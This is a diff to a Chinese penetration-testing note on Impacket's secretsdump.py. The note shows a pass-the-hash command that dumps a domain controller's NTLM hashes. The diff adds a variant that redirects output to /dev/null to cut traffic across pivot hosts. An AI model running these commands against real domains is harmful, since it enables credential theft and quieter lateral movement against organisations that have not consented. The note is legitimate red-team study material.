@@ -113,6 +113,10 @@ secretsdump.py主要从SAM、LSA secrets(包括 cached creds)和域控的NTDS.di
 ```
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc-ntlm -outputfile tmp
 ```
+secretsdump.py会把结果打印到标注输出，而渗透过程中可能经过多个跳板机，这样可能产生额外流量，为了避免这种情况，可以把输出定向到/dev/null。  
+```
+python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc-ntlm -outputfile tmp >/dev/null
+```
 
 ### \#0x01 用户凭证在windows系统如何存储:
 查看微软官方的说明
